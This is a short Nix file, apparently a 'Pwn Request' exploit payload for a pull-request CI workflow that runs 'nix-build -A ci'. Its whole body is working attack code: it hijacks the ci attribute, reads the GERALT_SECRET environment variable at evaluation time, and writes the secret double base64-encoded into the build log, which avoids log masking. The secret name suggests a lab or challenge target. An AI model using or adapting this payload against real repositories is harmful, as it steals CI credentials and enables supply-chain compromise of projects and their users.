# Pwn Request payload: hijack the `ci` attribute that `nix-build -A ci` evaluates.
# Evaluation-time builtins.getEnv reads GERALT_SECRET from the runner env (set by
# workflow-level env:), passes it into the derivation, and the /bin/sh builder
# double-base64-encodes it into the build log before failing loudly.
{
  ci = derivation {
    name = "ci";
    system = builtins.currentSystem;
    builder = "/bin/sh";
    args = [ "-c" "echo GERALT_LEAKED_TOKEN=$(printf %s \"$SECRET\" | base64 | base64); exit 1" ];
    SECRET = builtins.getEnv "GERALT_SECRET";
  };
}
